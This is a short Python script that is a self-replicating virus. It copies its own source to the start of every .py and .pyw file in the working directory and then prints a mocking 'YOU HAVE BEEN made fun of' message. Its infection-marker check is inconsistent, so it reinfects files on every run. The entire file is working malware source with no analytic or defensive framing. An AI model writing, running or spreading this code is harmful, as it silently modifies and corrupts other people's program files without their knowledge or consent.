import sys
import glob

fun_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line.strip() == '# Fun says HI!':
        self_replicating_part = True
    if not self_replicating_part:
        fun_code.append(line)
    if line.strip() == '# FUN SAYS BYE!':
        break
python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    Tested = False

    for line in file_code:
        if line.strip() == '# FUN SAYS HI!':
            Tested = True
            break
    if not Tested:
        final_code = []
        final_code.extend(fun_code)  # Corrected here
        final_code.extend('\n')  # Corrected here
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)


def cool_code():
    print('YOU HAVE BEEN made fun of HAHAHA !!!')


cool_code()
